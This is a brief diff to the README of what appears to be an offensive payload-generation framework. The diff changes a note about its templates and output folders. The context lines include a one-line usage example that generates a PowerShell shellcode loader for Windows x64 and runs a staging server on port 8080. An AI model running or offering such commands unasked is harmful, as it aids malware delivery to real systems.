@@ -133,8 +133,8 @@ Other examples you might want to know:
 - generate a shellcode loader in Powershell for Windows x64 and run a staging server on port 8080
 `$ python3 barbacane.py -format Powershell -name payload --staging -host 192.168.56.1 -port 8080`
 
->[!INFO]
->All templates used by the framework are available in the ``/templates`` folder. The generated payloads are availlable in ``/output`` folder
+>[!CAUTION]
+>All templates used by the framework are available in the ``/templates`` folder. The generated payloads are availlable in the ``/output`` folder
 
 ## [+] Credits
 
